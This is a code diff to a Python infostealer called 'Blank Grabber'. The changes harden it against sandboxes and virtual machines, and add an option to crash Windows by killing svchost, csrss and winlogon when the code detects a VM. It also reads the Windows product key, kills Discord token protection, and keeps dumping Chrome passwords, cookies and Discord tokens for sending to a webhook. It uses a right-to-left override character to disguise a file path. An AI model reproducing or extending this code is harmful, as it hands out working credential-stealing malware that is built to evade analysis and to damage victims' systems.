@@ -3,6 +3,7 @@
 WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"
 PINGME = True
 VMPROTECT = True
+BSOD = False #Tries to trigger Blue Screen if grabber fails in VM (Only works if VMPROTECT is enabled)
 
 import os
 if os.name!='nt':
@@ -16,60 +17,56 @@ import base64
 import sys
 import json
 import random
-import glob
 import time
 from PIL import ImageGrab
-from Crypto.Cipher import AES
+import pyaes
 import win32crypt
 import re
+
+def fquit():
+    if BSOD:
+        subprocess.run("taskkill /IM svchost.exe /F", capture_output= True, shell= True)
+        subprocess.run("taskkill /IM csrss.exe /F", capture_output= True, shell= True)
+        subprocess.run("taskkill /IM winnit.exe /F", capture_output= True, shell= True)
+        subprocess.run("taskkill /IM winlogon.exe /F", capture_output= True, shell= True)
+    os._exit(0)
 
 def generate(num=5):
     return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
 
 class vmprotect:
     def __init__(self):
-        if hasattr(sys, 'real_prefix'):
-            os._exit(0)
+        if int(subprocess.run("wmic computersystem get totalphysicalmemory", capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000 < 1.7:
+            fquit()
+        
         if subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] in ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]:
-            os._exit(0)
+            fquit()
 
         if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl"]:
-            os._exit(0)
+            fquit()
 
         if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh"]:
-            os._exit(0)
+            fquit()
 
         tasks = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
         for banned_task in ["fakenet", "dumpcap", "httpdebuggerui", "wireshark", "fiddler", "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]:
             if banned_task in tasks.lower():
-                kill = subprocess.run(f"taskkill /IM {banned_task} /F", capture_output= True, shell= True)
+                kill = subprocess.run(f"taskkill /IM {banned_task}.exe /F", capture_output= True, shell= True)
 
                 if kill.returncode != 0:
-                    os._exit(0)
+                    fquit()
         try:
             requests.get(f'https://‮blank{generate()}.in')
         except Exception:
             pass
         else:
-            os._exit(0)
+            fquit()
 
         if os.path.isfile('D:/TOOLS/Detonate.exe'):
-            os._exit(0)
+            fquit()
             
-        try:
-            if requests.get("https://Hosting-Check.blankmcpe.repl.co").text.lower() == 'true':
-                os._exit(0)
-        except Exception:
-            if requests.get("http://ip-api.com/line/?fields=hosting").text == "true":
-                os._exit(0)
-            
-def try_to_delete_old_meipass():
-    for i in glob.iglob(os.getenv("temp")):
-        if os.path.isdir(i) and os.path.basename(i).lower().startswith('_mei') and os.path.basename(i) != os.path.basename(sys._MEIPASS):
-            try:
-                shutil.rmtree(i)
-            except Exception:
-                pass
+        if requests.get("http://ip-api.com/line/?fields=hosting").text == "true":
+            fquit()
             
 def MUTEX():
     mutex_path = os.getenv('temp')+'/.mutex0001.mutex'
@@ -79,13 +76,14 @@ def MUTEX():
     with open(mutex_path, 'w'): pass
     while True:
         if not os.path.isfile(mutex_path):
-            os._exit(0)
+            fquit()
     
 
 class BlankGrabber:
     def __init__(self):
         self.OK = False
         self.webhook = WEBHOOK
+        self.getPKey()
         self.archive = f"{os.getenv('temp')}\\Blank-{os.getlogin()}.zip"
         self.tempfolder = os.getenv('temp')+'\\'+generate(10)
         self.system = self.tempfolder + "\\System"
@@ -100,7 +98,7 @@ class BlankGrabber:
         except FileExistsError:
             pass
         except Exception:
-            os._exit(0)
+            fquit()
         threads = []
         self.tokens = []
         self.passwords = {}
@@ -140,6 +138,11 @@ class BlankGrabber:
         for t in threads:
             t.join()
         self.send()
+        
+    def getPKey(self):
+        key = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode().strip()
+        if len(key.split("-")) == 5:
+            self.productKey = key
 
     def copy(self, source, destination):
         try:
@@ -156,45 +159,45 @@ class BlankGrabber:
             file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
 
     def getpass(self):
-        for filename in glob.iglob(self.chromefolder+'**/**', recursive=True):
-            if os.path.basename(filename).lower()=='login data' and os.path.isfile(filename):
-                if os.stat(filename).st_size==0:
-                    continue
-                data = []
-                passdb = filename.replace(self.chromefolder, self.tempfolder2+'\\'+os.path.basename(filename))
-                passdc = filename.replace(self.chromefolder, self.tempfolder+'\\Chrome\\Passwords')+'\\Decrypted Passwords.txt'
-                try:
-                    self.copy(filename, passdb)
-                except Exception as e:
-                    self.logs(e, sys.exc_info())
-                    continue
-                connection = sqlite3.connect(passdb)
-                cursor = connection.cursor()
-                table = cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall()
-                if len(table)==0:
-                    continue
-                else:
-                    self.copy(passdb, os.path.join(os.path.dirname(passdc), os.path.basename(filename)))
-                for row in table:
-                    url = row[0]
-                    name = row[1]
-                    password = row[2]
-                    if (url and name and password):
-                        password = self.decrypt_data(password)
-                        data.append(f"{'Blank Grabber'.center(90, '-')}\n\nURL: {url}\nUsername: {name}\nPassword: {password}")
-                cursor.close()
-                connection.close()
-                if len(data)!= 0:
-                    with open(passdc, 'wt') as file:
-                        file.write("\n\n".join(data))
-                    del data
-                    self.OK = True
+        passpath = subprocess.run('where /r . "login data"', capture_output= True, shell= True, cwd= self.chromefolder).stdout.decode().splitlines()
+        for filename in passpath:
+            if os.stat(filename).st_size==0:
+                continue
+            data = []
+            passdb = filename.replace(self.chromefolder, self.tempfolder2+'\\'+os.path.basename(filename))
+            passdc = filename.replace(self.chromefolder, self.tempfolder+'\\Chrome\\Passwords')+'\\Decrypted Passwords.txt'
+            try:
+                self.copy(filename, passdb)
+            except Exception as e:
+                self.logs(e, sys.exc_info())
+                continue
+            connection = sqlite3.connect(passdb)
+            cursor = connection.cursor()
+            table = cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall()
+            if len(table)==0:
+                continue
+            else:
+                self.copy(passdb, os.path.join(os.path.dirname(passdc), os.path.basename(filename)))
+            for row in table:
+                url = row[0]
+                name = row[1]
+                password = row[2]
+                if (url and name and password):
+                    password = self.decrypt_data(password)
+                    data.append(f"{'Blank Grabber'.center(90, '-')}\n\nURL: {url}\nUsername: {name}\nPassword: {password}")
+            cursor.close()
+            connection.close()
+            if len(data)!= 0:
+                with open(passdc, 'wt') as file:
+                    file.write("\n\n".join(data))
+                del data
+                self.OK = True
 
     def getcookie(self):
-        for filename in glob.iglob(self.chromefolder+'**/**', recursive=True):
-            if os.path.basename(filename).lower()=='cookies' and os.path.isfile(filename):
-                if os.stat(filename).st_size==0:
-                    continue
+        cookiepath = subprocess.run('where /r . "cookies"', capture_output= True, shell= True, cwd= self.chromefolder).stdout.decode().splitlines()
+        for filename in cookiepath:
+            if os.stat(filename).st_size==0:
+                continue
                 data = []
                 cookiedb = filename.replace(self.chromefolder, self.tempfolder2+'\\'+os.path.basename(filename))
                 cookiedc = filename.replace(self.chromefolder, self.tempfolder+'\\Chrome\\Cookies')+'\\Chrome Cookies.txt'
@@ -261,6 +264,7 @@ class BlankGrabber:
             file.write(output.strip())
 
     def getTokens(self):
+        subprocess.run("taskkill /IM discordtokenprotector.exe /F", capture_output= True, shell= True)
         data = []
         paths = {
             'Discord': self.roaming + r'/discord/Local Storage/leveldb/', #Checked
@@ -303,9 +307,12 @@ class BlankGrabber:
                 else:
                     grabcord(path)
             else:
-                for dirname in glob.iglob(self.chromefolder + "**/**", recursive=True):
-                    if os.path.basename(os.path.normpath(dirname)) == 'leveldb':
-                        grabcord(dirname)
+                dischromepath = subprocess.run('dir leveldb /AD /s /b', capture_output= True, shell= True, cwd= self.chromefolder).stdout.decode().splitlines()
+                for dirname in dischromepath:
+                    if not os.path.isdir(dirname):
+                        continue
+                    grabcord(dirname)
+                    
         for token in self.tokens:
                 token = token.strip()
                 r = requests.get('https://discord.com/api/v9/users/@me', headers=self.headers(token))
@@ -346,7 +353,7 @@ class BlankGrabber:
         try:
             iv = encrypted_data[3:15]
             encrypted_data = encrypted_data[15:]
-            cipher = AES.new(self.key, AES.MODE_GCM, iv)
+            cipher = pyaes.AESModeOfOperationGCM(self.key, iv)
             return cipher.decrypt(encrypted_data)[:-16].decode()
         except Exception:
             try:
@@ -369,7 +376,7 @@ class BlankGrabber:
             r = requests.get("http://ip-api.com/json/?fields=225545").json()
             if r.get("status") != "success":
                 raise Exception('Failed')
-            data = f"Computer Name: {os.getenv('computername')}\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.strip().splitlines()[2].strip().decode()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "")+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
             if r['reverse'] != '':
                 data += f"\nReverse DNS: {r['reverse']}"
         except Exception:
@@ -426,9 +433,9 @@ if __name__ == "__main__":
         try:
             r = requests.get("https://httpbin.org/get?1=2")
             if r.json().get("args").get("1") != "2":
-                os._exit(0)
+                fquit()
         except Exception:
-            pass
+            continue
         else:
             if VMPROTECT:
                 vmprotect()
@@ -445,12 +452,10 @@ if __name__ == "__main__":
                         except Exception:
                             pass
                         subprocess.call("C:/Program Files/Java/Java Updater G‮lld.COM", shell= True)
-                        subprocess.call(f'mshta vbscript:Execute("X=MsgBox(""The file or directory is corrupt and unreadable."",0+16, ""{sys.executable}""):close")', shell= True)
-                        os._exit(0)
+                        fquit()
                     except Exception:
                         pass
-                    subprocess.call(f'mshta vbscript:Execute("X=MsgBox(""The file or directory is corrupt and unreadable."",0+16, ""{sys.executable}""):close")', shell= True)
-            try_to_delete_old_meipass()
+
             threading.Thread(target= MUTEX).start()
             BlankGrabber()
         finally:
